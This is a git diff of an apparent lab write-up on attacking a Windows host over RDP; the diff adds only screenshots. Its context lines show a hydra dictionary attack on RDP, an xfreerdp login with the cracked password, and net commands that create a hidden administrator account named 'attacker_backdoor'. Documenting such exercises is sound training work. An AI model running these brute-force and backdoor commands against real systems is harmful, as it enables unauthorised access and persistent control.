@@ -36,6 +36,8 @@ With Port 3389 confirmed open, a targeted dictionary attack was launched against
 ```bash
 hydra -l Finn -P /home/arijit/Desktop/passwordset.txt -t 1 -w 2 rdp://192.168.100.2 -f -V
 ```
+<img width="991" height="466" alt="image" src="https://github.com/user-attachments/assets/a4a3cf2d-f557-40eb-8b90-1d17219f2602" />
+
 * **Throttling Parameters (`-t 1 -w 2`):** Applied precisely to ensure connection stability and prevent crashing the target's network interface stack.
 * **Result:** The tool parsed the list and successfully harvested the correct matching credential, halting execution immediately via the `-f` flag.
 
@@ -47,6 +49,8 @@ Upon discovering the valid working credentials for `Finn`, the attack shifted fr
 ```bash
 xfreerdp /v:192.168.100.2 /u:Finn /p:CorrectPassword! /dynamic-resolution /cert:ignore
 ```
+<img width="788" height="332" alt="image" src="https://github.com/user-attachments/assets/fc4fd594-a6ac-4775-ae74-2ee81e55882f" />
+
 * **Outcome:** This action bypasses standard automated boundaries, establishes a graphical interactive desktop terminal shell, and logs a distinct **Logon Type 10** footprint within the endpoint security kernel database.
 
 ---
@@ -60,5 +64,7 @@ An elevated Command Prompt (`cmd.exe`) was spawned within the active RDP session
 net user attacker_backdoor MaliciousPass123! /add
 net localgroup administrators attacker_backdoor /add
 ```
+<img width="850" height="201" alt="image" src="https://github.com/user-attachments/assets/8fda20b4-7721-4694-b5b0-ca56daab888e" />
+
 * **Mechanics:** A hidden secondary profile named `attacker_backdoor` was injected into the host system and elevated to the local `Administrators` security group, completing the post-compromise persistence phase.
 
